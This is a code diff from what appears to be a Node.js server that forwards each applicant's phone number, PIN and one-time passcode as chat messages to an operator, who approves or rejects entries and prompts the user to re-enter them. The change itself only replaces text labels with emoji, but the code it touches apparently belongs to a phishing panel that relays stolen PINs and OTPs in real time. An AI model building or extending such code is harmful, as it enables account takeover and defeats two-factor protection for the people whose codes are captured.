@@ -1251,7 +1251,7 @@ Super admin has been notified.
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-OTP \`${application.otp}\`
+🔢 \`${application.otp}\`
 
 ⚠️ User's PIN was incorrect
 👤 ${callbackQuery.from.first_name}
@@ -1271,7 +1271,7 @@ User will re-enter PIN.
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-OTP \`${application.otp}\`
+🔢 \`${application.otp}\`
 
 ⚠️ Wrong verification code
 👤 ${callbackQuery.from.first_name}
@@ -1291,7 +1291,7 @@ User will re-enter code.
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-PIN \`${application.pin}\`
+🔑 \`${application.pin}\`
 
 ✗ REJECTED
 👤 ${callbackQuery.from.first_name}
@@ -1308,7 +1308,7 @@ PIN \`${application.pin}\`
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-PIN \`${application.pin}\`
+🔑 \`${application.pin}\`
 
 ✓ APPROVED
 👤 ${callbackQuery.from.first_name}
@@ -1327,8 +1327,8 @@ User will now proceed to OTP.
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-PIN \`${application.pin}\`
-OTP \`${application.otp}\`
+🔑 \`${application.pin}\`
+🔢 \`${application.otp}\`
 
 ✓ FULLY APPROVED
 👤 ${callbackQuery.from.first_name}
@@ -1483,7 +1483,7 @@ ${userLabel}
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(phoneNumber)}\`
-PIN \`${pin}\`
+🔑 \`${pin}\`
 ⏰ ${new Date().toLocaleString()}${historyText}
 
 ⚠️ *VERIFY INFORMATION*
@@ -1550,7 +1550,7 @@ app.post('/api/verify-otp', async (req, res) => {
 
 📋 \`${applicationId}\`
 📞 \`${formatPhone(application.phoneNumber)}\`
-OTP \`${otp}\`
+🔢 \`${otp}\`
 ⏰ ${new Date().toLocaleString()}
 
 ⚠️ *VERIFY CODE*
